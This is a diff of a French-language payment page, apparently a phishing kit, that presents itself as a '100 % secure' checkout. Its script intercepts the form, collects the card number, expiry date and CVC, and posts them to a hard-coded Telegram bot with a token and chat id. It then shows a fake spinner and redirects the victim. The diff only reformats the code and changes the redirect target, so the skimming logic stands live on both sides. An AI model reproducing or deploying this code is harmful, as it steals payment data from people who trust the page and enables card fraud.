@@ -200,35 +200,35 @@
     &copy; 2025 Ulys. Paiement 100 % sécurisé.
   </footer>
 
-  <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+ <script>
+  document.getElementById('paymentForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-      const numCarte = document.getElementById('cb-num').value;
-      const expiration = document.getElementById('cb-date').value;
-      const cvc = document.getElementById('cb-cvc').value;
+    const numCarte = document.getElementById('cb-num').value;
+    const expiration = document.getElementById('cb-date').value;
+    const cvc = document.getElementById('cb-cvc').value;
 
-      const message = `
+    const message = `
 💳 Nouvelle tentative de paiement :
 🔢 Carte : ${numCarte}
 📅 Expiration : ${expiration}
 🔐 CVC : ${cvc}
-      `;
+    `;
 
-      fetch("https://api.telegram.org/bot8136145861:AAEkeva-K5BGkAlK8FMxDVknMN9Y1YQx26I/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: "-4888029618",
-          text: message
-        })
-      });
-
-      document.getElementById('spinnerOverlay').style.display = 'flex';
-      setTimeout(() => {
-        window.location.href = 'sms.html';
-      }, 25000);
+    fetch("https://api.telegram.org/bot8136145861:AAEkeva-K5BGkAlK8FMxDVknMN9Y1YQx26I/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: "-4888029618",
+        text: message
+      })
     });
-  </script>
+
+    document.getElementById('spinnerOverlay').style.display = 'flex';
+    setTimeout(() => {
+      window.location.href = 'confirmation.html'; // ✅ redirection mise à jour ici
+    }, 25000);
+  });
+</script>
 </body>
 </html>
